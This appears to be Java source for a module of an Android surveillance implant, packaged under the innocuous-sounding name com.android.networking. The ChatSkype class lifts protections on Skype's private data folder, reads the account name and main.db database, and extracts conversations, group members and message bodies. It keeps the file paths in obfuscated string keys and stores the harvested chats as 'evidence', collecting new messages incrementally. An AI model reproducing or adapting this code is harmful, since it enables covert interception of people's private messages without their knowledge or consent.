package com.android.networking.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordVisitor;
import com.android.networking.file.Path;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;

public class ChatSkype extends SubModuleChat {
	private static final String TAG = "ChatSkype";

	private static final int PROGRAM_SKYPE = 0x01;
	String pObserving = "skype";

	private Date lastTimestamp;

	private Hashtable<String, Long> lastSkype;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	ChatGroups groups = new ChatSkypeGroups();

	@Override
	public int getProgramId() {
		return PROGRAM_SKYPE;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastSkype = markup.unserialize(new Hashtable<String, Long>());
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastSkype: " + lastSkype);
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readSkypeMessageHistory() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory), semaphore red");
			}
			return;
		}
		try {
			boolean updateMarkup = false;

			// k_0=/data/data/com.skype.raider/files
			String dbDir = Messages.getString("k_0");
			Path.unprotect(dbDir, true);

			String account = readAccount();
			if (account == null || account.length() == 0)
				return;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
			}
			// k_1=/main.db
			String dbFile = dbDir + "/" + account + Messages.getString("k_1");

			Path.unprotect(dbDir + "/" + account, true);
			Path.unprotect(dbFile, true);
			Path.unprotect(dbFile + "-journal", true);

			File file = new File(dbFile);

			if (file.canRead()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory): can read DB");
				}

				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
				// SQLiteDatabase db = helper.getReadableDatabase();

				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
				for (SkypeConversation sc : conversations) {
					String peer = sc.remote;
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " lastReadIndex: "
								+ sc.lastReadIndex);
					}
					groups = new ChatSkypeGroups();

					// retrieves the lastConvId recorded as evidence for this
					// conversation
					long lastConvId = lastSkype.containsKey(account + peer) ? lastSkype.get(account + peer) : 0;

					if (sc.lastReadIndex > lastConvId) {
						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
							fetchGroup(helper, peer);
						}

						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
						if (lastReadId > 0) {
							updateMarkupSkype(account + peer, lastReadId, true);
						}

					}
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private List<SkypeConversation> getSkypeConversations(GenericSqliteHelper helper, final String account) {

		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();

		String[] projection = new String[] { "id", "identity", "displayname", "given_displayname", "inbox_message_id" };
		String selection = "inbox_timestamp > 0 and is_permanent=1";

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				SkypeConversation c = new SkypeConversation();
				c.account = account;
				c.id = cursor.getInt(0);
				c.remote = cursor.getString(1);
				c.displayname = cursor.getString(2);
				c.given = cursor.getString(3);
				c.lastReadIndex = cursor.getInt(4);

				conversations.add(c);
				return c.id;
			}
		};

		helper.traverseRecords("Conversations", visitor);
		return conversations;
	}

	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation conversation, long lastConvId) {

		// select author, body_xml from Messages where convo_id == 118 and id >=
		// 101 and body_xml != ''

		try {
			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
			String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > " + lastConvId;

			RecordVisitor visitor = new RecordVisitor(projection, selection) {

				@Override
				public long cursor(Cursor cursor) {
					// I read a line in a conversation.
					int id = cursor.getInt(0);
					String peer = cursor.getString(1);
					String body = cursor.getString(2);
					long timestamp = cursor.getLong(3);
					Date date = new Date(timestamp * 1000L);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: " +conversation.remote + " peer: " + peer);
					}
					
					boolean incoming = !(peer.equals(conversation.account));
					boolean isGroup = groups.isGroup(conversation.remote);
					
					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;
					
					from = incoming? peer: conversation.account;
					fromDisplay = incoming? conversation.displayname : from;
					
					if (isGroup) {
						to = groups.getGroupTo(peer, conversation.remote);
						toDisplay = to;
					}else{
						to = incoming? conversation.account : conversation.remote;
						toDisplay = incoming? conversation.account : conversation.displayname;
					}

					// se sc.peer e' gruppo si espande peer,sc.peer
					// se e' incoming, from e' peer, to e' expand
					// se a scrivere sono io, e' outgoing, quindi from =
					// account, to = expand
					// altrimenti e' incoming

					/*if (incoming) {
						from = peer;
						fromDisplay = sc.displayname;

						if (!isGroup) {
							to = sc.account;
							toDisplay = sc.account;
						}

					} else {
						// outgoing
						if (!isGroup) {
							to = peer;
							toDisplay = sc.displayname;
						}
						from = sc.account;
						fromDisplay = from;
					}*/

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						messages.add(message);
					}

					return id;
				}
			};

			// f_a=messages
			// Messages.getString("i_2")
			long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);

			if (messages != null && messages.size() > 0) {
				saveEvidence(messages);
			}

			return newLastId;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (fetchMessages) Error: " + e);
			}
			return -1;
		}

	}

	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {

		String[] projection = new String[] { "identity" };
		String selection = "chatname = '" + conversation + "'";

		RecordVisitor visitor = new RecordVisitor(projection, selection) {
			@Override
			public long cursor(Cursor cursor) {
				String remote = cursor.getString(0);
				groups.addPeerToGroup(conversation, remote);
				return 0;
			}
		};

		helper.traverseRecords("ChatMembers", visitor);
	}

	private String readAccount() throws IOException {

		// k_0=/data/data/com.skype.raider/files
		String dbDir = Messages.getString("k_0");

		// k_2=/shared.xml
		String confFile = dbDir + Messages.getString("k_2");

		Path.unprotect(confFile, true);

		DocumentBuilder builder;
		String account = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(confFile));
			NodeList defaults = doc.getElementsByTagName("Default");
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				Node p = d.getParentNode();
				if ("Account".equals(p.getNodeName())) {
					account = d.getFirstChild().getNodeValue();
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccount) Error: " + e);
			}
		}
		return account;
	}

	private void updateMarkupSkype(String account, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupSkype), mailStore: " + account + " +lastId: " + newLastId);
		}

		lastSkype.put(account, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastSkype);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

}
